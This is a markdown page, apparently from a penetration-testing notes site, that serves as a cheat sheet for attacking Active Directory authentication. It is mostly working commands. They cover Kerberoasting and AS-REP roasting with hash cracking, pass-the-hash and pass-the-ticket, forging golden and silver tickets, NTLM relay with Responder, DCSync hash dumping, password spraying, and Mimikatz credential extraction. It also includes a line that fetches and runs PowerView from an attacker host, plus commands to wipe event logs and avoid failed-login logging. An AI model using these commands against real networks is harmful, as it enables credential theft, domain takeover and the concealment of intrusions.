@@ -1,0 +1,275 @@
+---
+layout: page
+title: "AD Authentication"
+---
+
+# AD Authentication
+
+Active Directory authentication attacks target the protocols and mechanisms that AD uses to authenticate users: primarily Kerberos and NTLM. Understanding the underlying protocol is key to exploiting it correctly.
+
+## Kerberoasting
+
+Service Principal Names (SPNs) are registered against user accounts. Any authenticated domain user can request a Kerberos service ticket (TGS) for any SPN: and that ticket is encrypted with the service account's NTLM hash, which can be cracked offline.
+
+### Finding Kerberoastable Accounts
+
+```bash
+# Impacket
+GetUserSPNs.py domain.local/user:password -dc-ip <DC_IP>
+
+# Request tickets at the same time
+GetUserSPNs.py domain.local/user:password -dc-ip <DC_IP> -request
+
+# Save to file for cracking
+GetUserSPNs.py domain.local/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.txt
+```
+
+```powershell
+# PowerView
+Get-DomainUser -SPN | select name,serviceprincipalname
+
+# Invoke-Kerberoast
+IEX (New-Object Net.WebClient).DownloadString('http://KALI/PowerView.ps1')
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -FilePath kerberoast.txt -Width 8000
+
+# Rubeus
+Rubeus.exe kerberoast /nowrap
+Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast.txt
+```
+
+### Cracking TGS Tickets
+
+```bash
+# Hashcat: mode 13100 for Kerberoast
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+## AS-REP Roasting
+
+Accounts with "Do not require Kerberos preauthentication" enabled expose their hash in the AS-REP response to any unauthenticated request.
+
+### Finding and Exploiting
+
+```bash
+# Impacket: no credentials needed
+GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip <DC_IP> -no-pass
+
+# Single user
+GetNPUsers.py domain.local/username -dc-ip <DC_IP> -no-pass
+
+# With credentials: enumerate who has preauth disabled
+GetNPUsers.py domain.local/user:password -dc-ip <DC_IP> -request
+```
+
+```powershell
+# Rubeus
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+Rubeus.exe asreproast /nowrap
+
+# PowerView + ASREPRoast
+Get-DomainUser -PreauthNotRequired | Invoke-ASREPRoast -OutputFormat Hashcat
+```
+
+### Cracking AS-REP Hashes
+
+```bash
+# Hashcat: mode 18200
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+## Pass-the-Hash (PTH)
+
+NTLM authentication accepts the hash directly: no need to crack it.
+
+```bash
+# Impacket psexec
+psexec.py domain/administrator@<IP> -hashes :NTLM_HASH
+
+# Impacket wmiexec
+wmiexec.py domain/administrator@<IP> -hashes :NTLM_HASH
+
+# Impacket smbexec
+smbexec.py domain/administrator@<IP> -hashes :NTLM_HASH
+
+# CrackMapExec
+crackmapexec smb <IP> -u administrator -H NTLM_HASH
+crackmapexec smb <IP>/24 -u administrator -H NTLM_HASH --continue-on-success
+
+# Spray across subnet
+crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH
+
+# Evil-WinRM
+evil-winrm -i <IP> -u administrator -H NTLM_HASH
+```
+
+## Pass-the-Ticket (PTT)
+
+Inject a Kerberos ticket (TGT or TGS) into the current session:
+
+```shell
+# Rubeus: inject ticket
+Rubeus.exe ptt /ticket:base64_ticket_or_file.kirbi
+
+# Mimikatz: inject ticket
+mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"
+
+# List current tickets
+Rubeus.exe triage
+klist
+```
+
+## Overpass-the-Hash
+
+Convert an NTLM hash to a Kerberos TGT:
+
+```shell
+# Mimikatz
+mimikatz.exe "sekurlsa::pth /user:administrator /domain:domain.local /ntlm:NTLM_HASH /run:cmd.exe"
+
+# Rubeus
+Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /nowrap
+Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt  # Inject into session
+```
+
+## Golden Ticket
+
+Forged TGT signed with the krbtgt account hash: valid for any user, any service, indefinitely.
+
+### Requirements
+
+- Domain name
+- Domain SID
+- krbtgt NTLM hash
+
+```shell
+# Get krbtgt hash (requires DA / DCSync)
+mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
+
+# Get domain SID
+Get-DomainSID  # PowerView
+wmic computersystem get domain
+# Or from any SID in the domain: remove last part (RID)
+
+# Create golden ticket
+mimikatz.exe "kerberos::golden /user:fake_admin /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:KRBTGT_HASH /ptt"
+
+# Use immediately (ptt injects into session)
+klist
+dir \\dc.domain.local\c$
+```
+
+```bash
+# Impacket: create ticket file
+ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local fake_admin
+
+# Use ticket
+export KRB5CCNAME=fake_admin.ccache
+psexec.py domain.local/fake_admin@dc.domain.local -k -no-pass
+```
+
+## Silver Ticket
+
+Forged TGS for a specific service: uses the service account's hash instead of krbtgt. Stealthier, no DC contact needed.
+
+```shell
+# Create silver ticket for CIFS service
+mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_ACCOUNT_HASH /ptt"
+
+# For WMI
+mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:host /rc4:COMPUTER_HASH /ptt"
+```
+
+## NTLM Relay Attacks
+
+When SMB signing is not required, captured NTLM authentication can be relayed to other systems.
+
+```bash
+# Check SMB signing
+crackmapexec smb 192.168.1.0/24 --gen-relay-list nosigning.txt
+
+# Start NTLMRelayX
+ntlmrelayx.py -tf nosigning.txt -smb2support
+
+# Trigger authentication (via Responder poisoning or other means)
+sudo responder -I eth0 -wrf
+
+# Interactive shell on relay
+ntlmrelayx.py -tf nosigning.txt -smb2support -i
+
+# Execute command
+ntlmrelayx.py -tf nosigning.txt -smb2support -c "whoami > C:\\Windows\\Temp\\whoami.txt"
+
+# LDAP relay: create computer account or add user to DA
+ntlmrelayx.py -tf nosigning.txt -smb2support --no-smb-server --no-http-server -wh attacker.domain.local --delegate-access
+```
+
+## DCSync
+
+Replicate the domain database as if you were a DC: dumps all hashes:
+
+```bash
+# Requires: Domain Admin, Replication rights (Replicating Directory Changes All)
+
+# Impacket
+secretsdump.py domain.local/admin:password@<DC_IP>
+secretsdump.py domain.local/admin@<DC_IP> -hashes :NTLM_HASH
+
+# Specific account
+secretsdump.py domain.local/admin:password@<DC_IP> -just-dc-user administrator
+secretsdump.py domain.local/admin:password@<DC_IP> -just-dc-user krbtgt
+
+# All hashes
+secretsdump.py domain.local/admin:password@<DC_IP> -just-dc-ntlm
+```
+
+```shell
+# Mimikatz
+mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"
+mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"
+mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
+```
+
+## Password Spraying
+
+One password across all users: avoids lockout:
+
+```bash
+# Check password policy first
+crackmapexec smb <DC_IP> -u user -p password --pass-pol
+
+# CrackMapExec spray
+crackmapexec smb <DC_IP> -u users.txt -p 'Password123!' --continue-on-success
+
+# Kerbrute spray (via Kerberos: no failed login events in 4625 log)
+kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Password123!'
+
+# Domain spray
+kerbrute userenum -d domain.local --dc <DC_IP> usernames.txt
+```
+
+## Mimikatz
+
+```shell
+# Full privilege
+privilege::debug
+
+# Dump all credentials from LSASS
+sekurlsa::logonpasswords
+
+# NTLM hashes from SAM
+lsadump::sam
+
+# Cached credentials
+lsadump::cache
+
+# LSA secrets
+lsadump::secrets
+
+# Kerberos tickets
+sekurlsa::tickets /export
+
+# Wipe event logs
+event::clear
+```
